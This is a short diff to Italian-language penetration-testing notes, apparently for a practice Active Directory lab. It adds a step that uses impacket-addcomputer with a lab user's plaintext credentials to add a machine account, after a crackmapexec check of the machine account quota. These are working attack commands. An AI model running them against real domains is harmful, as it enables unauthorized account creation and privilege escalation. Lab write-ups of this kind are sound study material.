@@ -105,3 +105,7 @@ Vediamo il machine account quota (Quanti computer puoi aggiungere al domain) del
 crackmapexec ldap winterfell.north.sevenkingdoms.local -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M MAQ
 ```
 ![[Pasted image 20230825161202.png]]
+Ora aggiungiamo il nuovo computer al domain
+```bash
+impacket-addcomputer -computer-name 'samaccountname$' -computer-pass 'ComputerPassword' -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH 'north.sevenkingdoms.local/jon.snow:iknownothing'
+```
